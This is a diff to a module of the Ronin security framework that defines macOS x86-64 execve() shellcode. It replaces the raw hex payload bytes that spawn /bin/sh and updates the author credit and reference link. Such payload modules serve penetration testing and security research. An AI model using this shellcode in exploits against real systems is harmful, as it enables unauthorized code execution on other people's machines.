@@ -36,7 +36,8 @@ module Ronin
             arch :x86_64
             os :macos
 
-            author 'Csaba Fitzl', twitter: 'theevilbit'
+            author 'Thireus', twitter: 'Thireus',
+                              blog:    'https://blog.thireus.com/'
 
             summary 'macOS x86-64 execve() shellcode'
             description <<~DESC
@@ -44,17 +45,17 @@ module Ronin
             DESC
 
             references [
-              "https://www.exploit-db.com/exploits/38065"
+              "https://blog.thireus.com/execvebinsh-binsh-null-macos-mach-o-x86-64/"
             ]
 
             #
             # Builds the shellcode.
             #
             def build
-              @payload = "\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69" \
-                         "\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31" \
-                         "\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28" \
-                         "\xb0\x3b\x0f\x05".b
+              @payload = "\x48\x31\xd2\x48\xc7\xc0\xf6\xff\xff\x01" \
+                         "\x48\x83\xc0\x45\x5f\x52\x57\x48\x89\xe6" \
+                         "\x0f\x05\xe8\xe5\xff\xff\xff\x2f\x62\x69" \
+                         "\x6e\x2f\x2f\x73\x68".b
             end
 
           end
